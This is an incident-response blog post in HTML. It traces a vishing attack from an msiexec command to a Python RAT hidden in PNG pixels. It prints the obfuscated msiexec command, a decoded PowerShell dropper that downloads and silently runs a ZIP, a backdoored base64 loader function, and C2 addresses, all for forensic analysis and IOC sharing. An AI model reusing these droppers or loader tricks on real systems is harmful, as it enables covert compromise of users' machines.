@@ -1,0 +1,626 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="Reversing a 5-stage malware chain: from a social-engineered msiexec command to a fully functional RAT hidden in PNG pixel data via steganography.">
+<title>Five Stages of Steganography: Reversing a RAT Hidden in PNG Pixels | Jacobrakai</title>
+<style>
+  :root {
+    --bg: #101014;
+    --surface: #18181e;
+    --surface-raised: #1f1f27;
+    --border: #2a2a35;
+    --border-light: #35354a;
+    --text: #d4d4d8;
+    --text-dim: #8888a0;
+    --text-bright: #ececf0;
+    --accent: #7eb8da;
+    --accent-hover: #a0d0ee;
+    --green: #5cb870;
+    --red: #d45555;
+    --yellow: #c9a84c;
+    --orange: #cc7744;
+  }
+  * { box-sizing: border-box; margin: 0; padding: 0; }
+  body {
+    font-family: 'Segoe UI', system-ui, -apple-system, sans-serif;
+    background: var(--bg);
+    color: var(--text);
+    line-height: 1.7;
+  }
+  a { color: var(--accent); text-decoration: none; }
+  a:hover { color: var(--accent-hover); }
+  .skip-link {
+    position: absolute;
+    top: -100px;
+    left: 0;
+    background: var(--accent);
+    color: var(--bg);
+    padding: 8px 16px;
+    z-index: 100;
+    font-size: 14px;
+  }
+  .skip-link:focus { top: 0; }
+  .container { max-width: 680px; margin: 0 auto; padding: 0 24px; }
+
+  nav {
+    padding: 20px 0;
+    margin-bottom: 48px;
+  }
+  nav .container { display: flex; justify-content: space-between; align-items: center; }
+  nav .logo {
+    font-size: 15px;
+    font-weight: 600;
+    color: var(--text-dim);
+    letter-spacing: 0.5px;
+    font-family: 'Consolas', 'Fira Code', 'SF Mono', monospace;
+  }
+  nav .logo:hover { color: var(--text-bright); }
+  nav .links a { margin-left: 28px; color: var(--text-dim); font-size: 14px; letter-spacing: 0.3px; }
+  nav .links a:hover { color: var(--text); }
+
+  /* POST HEADER */
+  .post-header {
+    margin-bottom: 40px;
+    padding-bottom: 32px;
+    border-bottom: 1px solid var(--border);
+  }
+  .post-header h1 {
+    font-size: 30px;
+    line-height: 1.3;
+    margin-bottom: 16px;
+    color: var(--text-bright);
+    letter-spacing: -0.5px;
+    font-weight: 700;
+  }
+  .post-header .meta {
+    font-size: 12px;
+    color: var(--text-dim);
+    font-family: 'Consolas', 'Fira Code', 'SF Mono', monospace;
+    line-height: 1.8;
+  }
+  .tag {
+    display: inline-block;
+    font-size: 11px;
+    margin-right: 4px;
+    font-weight: 600;
+    font-family: 'Consolas', 'Fira Code', 'SF Mono', monospace;
+    letter-spacing: 0.3px;
+  }
+  .tag-ir { color: var(--red); }
+  .tag-ir::before { content: "#"; }
+  .tag-dfir { color: var(--orange); }
+  .tag-dfir::before { content: "#"; }
+  .tag-splunk { color: var(--green); }
+  .tag-splunk::before { content: "#"; }
+  .tag-malware { color: var(--red); }
+  .tag-malware::before { content: "#"; }
+
+  /* ARTICLE TYPOGRAPHY */
+  article {
+    font-size: 16px;
+    line-height: 1.8;
+    color: var(--text);
+  }
+  article h2 {
+    font-size: 20px;
+    margin-top: 48px;
+    margin-bottom: 16px;
+    padding-top: 24px;
+    color: var(--text-bright);
+    font-weight: 700;
+    letter-spacing: -0.3px;
+    border-top: 1px solid var(--border);
+  }
+  article h2:first-child {
+    border-top: none;
+    margin-top: 0;
+    padding-top: 0;
+  }
+  article h3 {
+    font-size: 16px;
+    margin-top: 28px;
+    margin-bottom: 10px;
+    color: var(--text-bright);
+    font-weight: 600;
+  }
+  article p {
+    margin-bottom: 18px;
+    font-size: 15px;
+    line-height: 1.8;
+  }
+  article > p:first-child {
+    font-size: 16px;
+    color: var(--text);
+    line-height: 1.85;
+  }
+  article ul, article ol {
+    margin: 12px 0 20px 20px;
+    font-size: 15px;
+  }
+  article li {
+    margin-bottom: 8px;
+    line-height: 1.75;
+  }
+  article strong {
+    color: var(--text-bright);
+    font-weight: 600;
+  }
+
+  /* CODE */
+  code {
+    font-family: 'Consolas', 'Fira Code', 'SF Mono', monospace;
+    font-size: 13px;
+    background: var(--surface);
+    padding: 2px 6px;
+    border-radius: 2px;
+    border: 1px solid var(--border);
+    color: var(--accent);
+  }
+  pre {
+    background: var(--surface);
+    border-left: 3px solid var(--border-light);
+    padding: 18px 20px;
+    overflow-x: auto;
+    margin: 16px 0 24px;
+    font-size: 13px;
+    line-height: 1.6;
+    border-radius: 0;
+    -webkit-overflow-scrolling: touch;
+  }
+  pre code {
+    background: none;
+    border: none;
+    padding: 0;
+    color: var(--text);
+    word-wrap: normal;
+    white-space: pre;
+  }
+
+  /* CALLOUTS */
+  .callout {
+    border-left: 3px solid var(--accent);
+    padding: 14px 18px;
+    margin: 20px 0 24px;
+    font-size: 14px;
+    line-height: 1.7;
+    color: var(--text);
+    background: transparent;
+  }
+  .callout-warn { border-left-color: var(--yellow); }
+  .callout-good { border-left-color: var(--green); }
+  .callout-bad { border-left-color: var(--red); }
+
+  /* TABLES */
+  .table-wrap {
+    overflow-x: auto;
+    margin: 16px 0 24px;
+    -webkit-overflow-scrolling: touch;
+  }
+  table {
+    width: 100%;
+    border-collapse: collapse;
+    font-size: 13px;
+    font-family: 'Consolas', 'Fira Code', 'SF Mono', monospace;
+  }
+  th {
+    text-align: left;
+    padding: 10px 14px;
+    border-bottom: 2px solid var(--border-light);
+    font-weight: 600;
+    color: var(--text-bright);
+    font-size: 11px;
+    text-transform: uppercase;
+    letter-spacing: 1px;
+  }
+  td {
+    padding: 8px 14px;
+    border-bottom: 1px solid var(--border);
+    color: var(--text);
+    vertical-align: top;
+  }
+  tr:hover td { background: var(--surface); }
+
+  /* FOOTER / NAV */
+  .post-footer {
+    margin-top: 56px;
+    padding-top: 24px;
+    border-top: 1px solid var(--border);
+    font-size: 14px;
+    font-family: 'Consolas', 'Fira Code', 'SF Mono', monospace;
+  }
+  .post-footer a { font-size: 13px; }
+  footer {
+    margin-top: 48px;
+    padding: 24px 0;
+    text-align: center;
+    font-size: 12px;
+    color: var(--text-dim);
+    font-family: 'Consolas', 'Fira Code', 'SF Mono', monospace;
+  }
+
+  /* SELECTION */
+  ::selection {
+    background: rgba(126, 184, 218, 0.25);
+    color: var(--text-bright);
+  }
+
+  @media (max-width: 600px) {
+    .post-header h1 { font-size: 24px; }
+    article h2 { font-size: 18px; }
+    .container { padding: 0 16px; }
+    pre { padding: 14px 12px; font-size: 12px; }
+    table { font-size: 12px; }
+    th, td { padding: 6px 8px; }
+  }
+</style>
+</head>
+<body>
+
+<a href="#main" class="skip-link">Skip to content</a>
+
+<nav>
+  <div class="container">
+    <a href="/" class="logo">jacob@rakai ~$</a>
+    <div class="links">
+      <a href="/">posts</a>
+      <a href="/about.html">about</a>
+    </div>
+  </div>
+</nav>
+
+<div class="container" id="main">
+  <div class="post-header">
+    <h1>Five Stages of Steganography: Reversing a RAT Hidden in PNG Pixels</h1>
+    <div class="meta">
+      2026-03-18 &middot; ~18 min read<br>
+      <span class="tag tag-ir">IR</span>
+      <span class="tag tag-dfir">DFIR</span>
+      <span class="tag tag-malware">malware</span>
+    </div>
+  </div>
+
+  <article>
+
+    <p>This is the one I keep coming back to. A Cloud IOC fires on a medium-severity msiexec event, and five stages later I'm staring at 90,000 characters of RAT source code extracted from the red channel of a PNG file. The attacker replaced Python's own <code>base64.py</code> to hide the whole thing in plain sight. Here's the full chain, from the social engineering hook to the steganographic payload.</p>
+
+    <p>Names, hostnames, and organizational details have been sanitized. The attacker domain and infrastructure are shown as-is.</p>
+
+    <h2>The Attack Chain</h2>
+
+<pre><code>  STAGE 0: Social Engineering (likely vishing)
+     |
+     v
+  STAGE 1: msiexec /Q remote MSI install via Win+R Run dialog
+     |  "PowershellCleaner" by "CCATechnology" — 32KB, WiX Toolset
+     |
+     v
+  STAGE 2: cleaner.ps1 — obfuscated PowerShell dropper (1,117 bytes)
+     |  Integer array -> string -> iex
+     |
+     v
+  STAGE 3: Dropbox ZIP — trojanized WinPython distribution
+     |  Full Python install with one key modification
+     |
+     v
+  STAGE 4: nlib.py calls base64.z85encode() -> exec()
+     |  But base64.py in Lib/ has been REPLACED
+     |  z85encode() now reads background1.png and extracts pixel data
+     |
+     v
+  STAGE 5: background1.png — 4.9 MB steganographic payload
+     |  Red channel of each pixel = one ASCII character
+     |  90,125 characters of Python RAT source code
+     |
+     v
+  ASYNC RAT: RC4-encrypted C2 comms, dual C2 servers
+     |  Beaconing, recon, command exec, persistence
+     |  138.68.15.116 (DigitalOcean) / 67.217.228.8 (BitLaunch)
+     v
+  PERSISTENCE: script.vbs -> pythonw.exe -> hidden PowerShell
+     MemoryChecker.lnk in Startup folder</code></pre>
+
+    <h2>Initial Detection</h2>
+
+    <p>Cisco Secure Endpoint fired a Cloud IOC &mdash; <code>W32.MSIExecRemoteInstall.ioc</code>, Medium severity. The alert flagged someone running <code>msiexec</code> with a remote URL, which is suspicious on its own. But the specifics made it worse: the command was executed through the Win+R Run dialog, and the target URL pointed to an external domain none of us had ever seen.</p>
+
+    <p>The user was a new hire in social services, about 7 weeks on the job.</p>
+
+    <h2>The Social Engineering</h2>
+
+    <p>Here's the command the user pasted into the Run dialog:</p>
+
+<pre><code>msIeXEC.exe /paCkAGE http:\\sendtokenscf[.]com\system32\..\Verification\..\UserID466943 /Q</code></pre>
+
+    <p>Let's break down the evasion techniques packed into this one line:</p>
+
+    <ul>
+      <li><strong>Mixed casing</strong> &mdash; <code>msIeXEC</code>, <code>/paCkAGE</code>. Bypasses naive string matching while Windows happily ignores case.</li>
+      <li><strong>Backslashes instead of forward slashes</strong> in the URL &mdash; <code>http:\\</code> instead of <code>http://</code>. Windows resolves this correctly. Some URL parsers and filters don't.</li>
+      <li><strong>Path traversal that cancels itself</strong> &mdash; <code>\system32\..\Verification\..\UserID466943</code> resolves to just <code>\UserID466943</code>. The <code>system32</code> and <code>Verification</code> path components exist purely to make it look legitimate.</li>
+      <li><strong><code>/Q</code> flag</strong> &mdash; silent install. No UI, no prompts, no evidence on screen.</li>
+      <li><strong>"Verification" and "UserID466943"</strong> &mdash; designed to look like a routine IT identity verification step. Exactly the kind of thing a new hire would expect.</li>
+    </ul>
+
+    <p>Then I checked the RunMRU registry key. This is where Windows stores everything typed into the Win+R Run dialog. The user's RunMRU had only two complete entries, and both were the malicious msiexec command. There was also a partial third attempt &mdash; the same command, truncated. No other Run history at all.</p>
+
+    <div class="callout callout-warn">Two complete entries plus a partial third attempt, with zero other Run history, is consistent with someone being coached through the process in real time &mdash; likely over the phone. The first attempt probably failed or appeared to hang silently (<code>/Q</code> gives no feedback), so they were told to try again.</div>
+
+    <p>We never definitively proved the delivery method. Email logs were clean. Teams was unused. No remote access tools were found. No browser history of <code>sendtokenscf[.]com</code>. USB artifacts were clean. Everything points to a phone call &mdash; a vishing attack &mdash; but we couldn't prove it. A new hire, 7 weeks in, still learning what's normal, gets a call from "IT" asking them to run a verification command. It's a textbook play.</p>
+
+    <h2>Stage 1 &mdash; The MSI</h2>
+
+    <p>The MSI was tiny &mdash; just 32 KB. I pulled it apart and the metadata told a story:</p>
+
+    <div class="table-wrap">
+    <table>
+      <tr><th>Property</th><th>Value</th></tr>
+      <tr><td>Product Name</td><td>PowershellCleaner</td></tr>
+      <tr><td>Manufacturer</td><td>CCATechnology</td></tr>
+      <tr><td>Build Tool</td><td>WiX Toolset v3.14.1.8722</td></tr>
+      <tr><td>ProductCode</td><td>{695DAA0E-19BC-455C-81B2-6A4A1EC1DB0E}</td></tr>
+      <tr><td>cleaner.ps1 created</td><td>8:32 AM</td></tr>
+      <tr><td>MSI built</td><td>9:37 AM</td></tr>
+      <tr><td>User executed</td><td>2:19 PM</td></tr>
+    </table>
+    </div>
+
+    <p>Same-day build. The attacker wrote <code>cleaner.ps1</code> at 8:32 AM, packaged it into the MSI at 9:37 AM, and the user ran it at 2:19 PM. A five-hour turnaround from payload creation to execution. The MSI was built fresh for this specific attack.</p>
+
+    <p>Inside the MSI, a <strong>CustomAction</strong> at install sequence 6601 auto-runs <code>cleaner.ps1</code> via a hidden PowerShell process with <code>-ExecutionPolicy Bypass</code>. The MSI is just a delivery vehicle &mdash; install it, run the script, done.</p>
+
+    <div class="callout">MSI metadata is forensically rich. Build timestamps, tooling versions, product GUIDs, author names &mdash; the attacker left their build environment fingerprint in the installer. "CCATechnology" and "PowershellCleaner" are almost certainly reused across campaigns.</div>
+
+    <h2>Stage 2 &mdash; The Dropper</h2>
+
+    <p><code>cleaner.ps1</code> was 1,117 bytes. The obfuscation was straightforward &mdash; an integer array that gets converted to a character string and piped to <code>iex</code> (Invoke-Expression):</p>
+
+<pre><code># Obfuscated form (truncated):
+$arr = @(73,69,88,...); $s = ''; foreach($i in $arr){ $s += [char]$i }; iex $s</code></pre>
+
+    <p>Decoded, it was simple:</p>
+
+<pre><code># Downloads zip from Dropbox
+$url = "https://dl.dropboxusercontent[.]com/s/[redacted]/wpython.zip"
+$dest = "$env:APPDATA\WPy64-31401"
+Invoke-WebRequest -Uri $url -OutFile "$dest\wpython.zip"
+Expand-Archive -Path "$dest\wpython.zip" -DestinationPath $dest -Force
+Start-Process "$dest\pythonw.exe" -ArgumentList "$dest\nlib.py" -WindowStyle Hidden</code></pre>
+
+    <p>Download a zip from Dropbox, extract it to <code>%APPDATA%\WPy64-31401\</code> (mimicking a legitimate <a href="https://winpython.github.io/">WinPython</a> installation path), and silently launch <code>pythonw.exe nlib.py</code>. The <code>pythonw.exe</code> binary runs Python without a console window &mdash; no visible process window for the user to notice.</p>
+
+    <h2>Stage 3 &mdash; The Trojanized Python</h2>
+
+    <p>The Dropbox zip contained a full WinPython distribution. Legitimate Python interpreter, legitimate standard library, legitimate directory structure. Everything you'd expect from a normal portable Python install. With one critical modification.</p>
+
+    <p>We'll get to that modification in a moment. First, the launcher.</p>
+
+    <h2>Stage 4 &mdash; The Supply Chain Trick</h2>
+
+    <p>This is where it gets clever.</p>
+
+    <p><code>nlib.py</code> was over 500 lines of what looked like garbage. Standard library test functions &mdash; string manipulation, math operations, list comprehensions &mdash; all with 40-to-80-character randomized variable names. Scrolling through it, your eyes glaze over. It looks like someone dumped a bunch of junk stdlib tests into a file. A defender doing a quick scan would move on.</p>
+
+    <p>But line 513:</p>
+
+<pre><code>result = base64.z85encode(b"placeholder")
+exec(result)</code></pre>
+
+    <p>That looks wrong. <code>z85encode()</code> returns bytes, not executable code. And you don't <code>exec()</code> the result of an encoding function. Something is off.</p>
+
+    <p>Here's the trick: <strong>Python's own <code>base64.py</code> in the <code>Lib/</code> directory had been replaced with a backdoored version.</strong></p>
+
+    <p>The attacker took the real <code>base64.py</code> from CPython's standard library and rewrote the <code>z85encode()</code> function. Instead of performing Z85 encoding, it now does this:</p>
+
+<pre><code>def z85encode(data):
+    # 1. Open background1.png from a subdirectory
+    png_path = os.path.join(os.path.dirname(__file__), 'data', 'background1.png')
+    with open(png_path, 'rb') as f:
+        png_data = f.read()
+
+    # 2. Parse PNG chunks manually (IHDR, IDAT, IEND)
+    chunks = []
+    offset = 8  # skip PNG signature
+    while offset < len(png_data):
+        length = int.from_bytes(png_data[offset:offset+4], 'big')
+        chunk_type = png_data[offset+4:offset+8]
+        chunk_data = png_data[offset+8:offset+8+length]
+        chunks.append((chunk_type, chunk_data))
+        offset += 12 + length
+        if chunk_type == b'IEND':
+            break
+
+    # 3. Decompress IDAT pixel data via zlib
+    idat_data = b''.join(d for t, d in chunks if t == b'IDAT')
+    raw_pixels = zlib.decompress(idat_data)
+
+    # 4. Extract ASCII characters from the red channel
+    extracted = ''
+    for pixel_byte in raw_pixels:
+        if 32 <= pixel_byte <= 126:  # printable ASCII range
+            extracted += chr(pixel_byte)
+
+    return extracted  # returns executable Python source code</code></pre>
+
+    <p>Read that again. The function signature is <code>z85encode()</code>. It's part of <code>base64.py</code>. Any import of <code>base64</code> loads it automatically. When <code>nlib.py</code> calls <code>base64.z85encode()</code>, Python doesn't download anything, doesn't import suspicious modules, doesn't touch the network. It opens a local PNG file, parses the pixel data, and returns a string. Then <code>nlib.py</code> calls <code>exec()</code> on that string.</p>
+
+    <div class="callout callout-warn"><strong>This is a supply-chain attack on the Python standard library itself.</strong> Instead of importing suspicious modules or adding new files that might get flagged, the attacker modified a trusted module that ships with every Python installation. No new imports. No unusual file access patterns. Just <code>import base64</code> &mdash; something that appears in millions of legitimate Python scripts.</div>
+
+    <h2>Stage 5 &mdash; The Steganography</h2>
+
+    <p>And now the payload.</p>
+
+    <p><code>background1.png</code> was 4.9 MB. Open it in an image viewer and it looks like a generic desktop wallpaper &mdash; dark gradient, vaguely abstract. Nothing suspicious. It would pass any manual review. It would pass most automated scanning too, because the file is a perfectly valid PNG with correct headers, correct chunks, correct checksums.</p>
+
+    <p>But each pixel's <strong>red channel</strong> contains one ASCII character.</p>
+
+    <p>I wrote a script to extract it:</p>
+
+<pre><code>from PIL import Image
+import sys
+
+img = Image.open('background1.png')
+pixels = img.load()
+width, height = img.size
+
+payload = ''
+for y in range(height):
+    for x in range(width):
+        r, g, b, *_ = pixels[x, y]
+        if 32 <= r <= 126:  # printable ASCII
+            payload += chr(r)
+
+print(f"Extracted {len(payload)} characters")
+with open('extracted_rat.py', 'w') as f:
+    f.write(payload)</code></pre>
+
+<pre><code>$ python extract.py
+Extracted 90125 characters</code></pre>
+
+    <p><strong>90,125 characters.</strong> A fully functional async RAT, written in Python, hidden in the red channel of a wallpaper image. Let that sink in for a second. You could run this PNG through VirusTotal, through any AV engine, through a sandbox &mdash; it's a valid image. The malicious content is only revealed when you parse the pixel data as text.</p>
+
+    <h3>The RAT Capabilities</h3>
+
+    <p>The extracted code was a complete asynchronous remote access trojan:</p>
+
+    <ul>
+      <li><strong>RC4 encryption</strong> for all C2 communications</li>
+      <li><strong>Protocol magic bytes</strong> <code>\xfe\xfe\x00\x01</code> prepended to every message</li>
+      <li><strong>HTTP POST beaconing</strong> to <code>/beacon/{agent_id}</code> on port 80</li>
+      <li><strong>Dual C2 servers</strong> &mdash; <code>138.68.15.116</code> (DigitalOcean) and <code>67.217.228.8</code> (BitLaunch) with automatic failover</li>
+      <li><strong>System reconnaissance</strong> &mdash; MAC address, hostname, ARP table, running processes</li>
+      <li><strong>Command execution</strong> via hidden PowerShell with <code>CREATE_NO_WINDOW</code></li>
+      <li><strong>Scheduled task persistence</strong> &mdash; daily trigger, runs as SYSTEM</li>
+      <li><strong>SSL certificate verification bypass</strong> for C2 comms</li>
+      <li><strong>Process hiding</strong> &mdash; runs via <code>pythonw.exe</code> with both <code>CREATE_NO_WINDOW</code> and <code>DETACHED_PROCESS</code> flags</li>
+    </ul>
+
+    <p>The use of <code>pythonw.exe</code> is deliberate &mdash; it's Python's "windowless" interpreter, designed for GUI applications that don't need a console. Running the RAT through it means no command prompt window ever appears, and the process name in Task Manager is just <code>pythonw.exe</code>, which looks benign on any machine with Python installed.</p>
+
+    <h2>Persistence Mechanisms</h2>
+
+    <p>The RAT set up a layered persistence chain:</p>
+
+    <ol>
+      <li><strong><code>script.vbs</code></strong> &mdash; a VBScript wrapper that launches <code>pythonw.exe</code> via a hidden PowerShell process with a 3-second sleep delay (likely to avoid racing with system startup)</li>
+      <li><strong><code>MemoryChecker.lnk</code></strong> &mdash; a shortcut placed in the Startup folder, pointing to <code>script.vbs</code></li>
+      <li><strong>Scheduled task</strong> &mdash; daily execution as SYSTEM for persistence even if the Startup folder is cleaned</li>
+    </ol>
+
+    <p>One detail stood out: the <code>MemoryChecker.lnk</code> shortcut pointed to the <strong>Administrator profile path</strong>, not the user's profile path. The user who ran the msiexec command was not a local admin. This means the malware &mdash; or the attacker interactively &mdash; obtained elevated privileges at some point after initial execution. The MSI's <code>/Q</code> silent install running through msiexec under the user's context shouldn't have had admin access. Something escalated.</p>
+
+    <h2>Proving the Infection Vector</h2>
+
+    <p>One of the most important parts of any IR is definitively proving how the infection happened. "The user probably ran a command" isn't good enough for a report. I needed proof. Four independent artifact sources gave me that proof.</p>
+
+    <h3>RunMRU Registry</h3>
+
+<pre><code>HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
+
+MRUList: ba
+a: msIeXEC.exe /paCkAGE http:\\sendtokenscf[.]com\system32\..
+   \Verification\..\UserID466943 /Q\1
+b: msIeXEC.exe /paCkAGE http:\\sendtokenscf[.]com\system32\..
+   \Verification\..\UserID466943 /Q\1</code></pre>
+
+    <p>Only two entries ever recorded in the Run dialog. Both are the malicious command. No other Run history on this machine, ever.</p>
+
+    <h3>UserAssist</h3>
+
+<pre><code>HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\UserAssist
+
+msiexec.exe
+  Last Executed: 2:22 PM
+  Run Count: 3
+  Focus Time: 0 ms</code></pre>
+
+    <p><code>FocusMs: 0</code> is significant &mdash; it means the process window never had focus. Consistent with the <code>/Q</code> silent flag. The user never saw a window.</p>
+
+    <h3>BAM (Background Activity Moderator)</h3>
+
+<pre><code>SYSTEM\CurrentControlSet\Services\bam\State\UserSettings\{user SID}
+
+powershell.exe    2:19 PM
+msiexec.exe       2:19 PM</code></pre>
+
+    <p>PowerShell and msiexec executing back-to-back under the user's SID, at the exact timestamp the MSI was downloaded.</p>
+
+    <h3>Prefetch Chain</h3>
+
+<pre><code>MSEDGE.EXE-*.pf        (browser active before infection)
+POWERSHELL.EXE-*.pf    (Stage 2 execution)
+DLLHOST.EXE-*.pf       (MSI helper process)
+MSIEXEC.EXE-*.pf       (Stage 1 MSI install)</code></pre>
+
+    <h3>Device Trajectory</h3>
+
+    <p>Cisco Secure Endpoint's device trajectory showed the parent process of <code>msiexec.exe</code> was <code>explorer.exe</code>. When you run something from the Win+R Run dialog, <code>explorer.exe</code> is always the parent. If it had been launched from a script or another process, the parent would be different.</p>
+
+    <div class="callout callout-good"><strong>Four independent artifacts, one story.</strong> RunMRU shows what was typed. UserAssist shows when it ran and that it was silent. BAM confirms execution under the user's SID. Prefetch shows the process chain. Device trajectory confirms explorer.exe as parent. This is airtight.</div>
+
+    <h2>What We Couldn't Determine</h2>
+
+    <p>Despite all of this, we never proved how the user received the command to paste. Email logs across all platforms were clean. Teams wasn't in use. No remote access tools were installed. Browser history didn't contain <code>sendtokenscf[.]com</code> &mdash; the user never visited the domain directly, only passed it to msiexec. USB forensics came up empty.</p>
+
+    <p>The most likely scenario is vishing &mdash; a phone call. Someone called the user, posed as IT, and walked them through the "verification" step. The evidence supports this: the RunMRU showing multiple attempts is consistent with someone being talked through a process when the first try doesn't produce visible results (because <code>/Q</code> suppresses all UI). The user was a new hire, 7 weeks in, still building mental models of what's normal and what isn't. "IT needs you to verify your workstation" is completely plausible in that context.</p>
+
+    <p>But "most likely" isn't "confirmed." Without call logs or the user's admission, the delivery mechanism remains unproven.</p>
+
+    <h2>The Lesson That Still Stings</h2>
+
+    <div class="callout callout-bad"><strong>The machine was wiped before a forensic image was taken.</strong> All of the analysis above was performed live via C$ admin share &mdash; remoting into the filesystem while the machine was still running. The malware artifacts, the steganographic PNG, the trojanized <code>base64.py</code>, the 90,125-character RAT source code &mdash; all documented in the incident report but never preserved as files. When the machine was wiped, they were gone. Permanently. I wrote about every stage in detail, but I can't hand anyone the actual artifacts. Image first, investigate second. Always.</div>
+
+    <h2>Key Takeaways</h2>
+
+    <ul>
+      <li><strong>Supply-chain attacks can target the Python standard library.</strong> Replacing <code>base64.py</code> is brilliant &mdash; no suspicious imports, no new files, just a modified trusted module. If you're analyzing a trojanized Python distribution, don't just look at the scripts. Diff the standard library against a known-good copy.</li>
+      <li><strong>PNG steganography hides 90K characters in plain sight.</strong> The file looks like a normal background image. It opens correctly. It has valid headers and checksums. Traditional file scanning and even sandbox analysis won't catch it because the file isn't malicious &mdash; the data is.</li>
+      <li><strong>MSI metadata is forensically rich.</strong> Build timestamps, tooling versions, manufacturer strings, product GUIDs &mdash; the attacker left their build environment fingerprint in the MSI. Cross-reference these against known campaigns.</li>
+      <li><strong>RunMRU + UserAssist + BAM + Prefetch = definitive proof of execution method.</strong> Four independent artifacts corroborating the same story. Any single one could be questioned. All four together are conclusive.</li>
+      <li><strong>Image before you investigate.</strong> You can always analyze an image later. You can't image a wiped machine. The investigation will still be there tomorrow. The disk might not be.</li>
+      <li><strong>New hires are high-value social engineering targets.</strong> Seven weeks on the job, still learning what's normal, unlikely to question "IT verification." Onboarding security awareness training needs to happen on day one, not day thirty.</li>
+    </ul>
+
+    <h2>IOCs</h2>
+
+    <div class="table-wrap">
+    <table>
+      <tr><th>Type</th><th>Value</th></tr>
+      <tr><td>Domain</td><td>sendtokenscf[.]com (MSI delivery)</td></tr>
+      <tr><td>C2 IP</td><td>138.68.15.116 (DigitalOcean)</td></tr>
+      <tr><td>C2 IP</td><td>67.217.228.8 (BitLaunch)</td></tr>
+      <tr><td>SHA-256</td><td>293032B4366852BE28C0CE373F560064256BC2FB4964AF1EDD0849636B3A1227</td></tr>
+      <tr><td>Dropbox URL</td><td>hxxps://dl[.]dropboxusercontent[.]com/s/[redacted]/wpython.zip</td></tr>
+      <tr><td>ProductCode</td><td>{695DAA0E-19BC-455C-81B2-6A4A1EC1DB0E}</td></tr>
+      <tr><td>C2 Beacon</td><td>/beacon/{agent_id} on port 80</td></tr>
+      <tr><td>Magic Bytes</td><td>\xfe\xfe\x00\x01</td></tr>
+      <tr><td>Persistence</td><td>MemoryChecker.lnk, script.vbs, scheduled task (daily/SYSTEM)</td></tr>
+    </table>
+    </div>
+
+    <h2>Tools Used</h2>
+
+    <ul>
+      <li>Cisco Secure Endpoint (AMP) &mdash; device trajectory + Cloud IOC detection</li>
+      <li>Registry forensics &mdash; RunMRU, UserAssist, BAM analysis</li>
+      <li>Prefetch analysis &mdash; execution chain reconstruction</li>
+      <li>Python &mdash; MSI metadata parsing, PNG steganography extraction</li>
+      <li>PowerShell + WMI &mdash; remote forensic collection via C$ admin share</li>
+    </ul>
+
+  </article>
+
+  <div class="post-footer">
+    <a href="/">&larr; back to posts</a>
+  </div>
+</div>
+
+<footer>
+  <div class="container">
+    &copy; 2026 jacobrakai
+  </div>
+</footer>
+
+</body>
+</html>
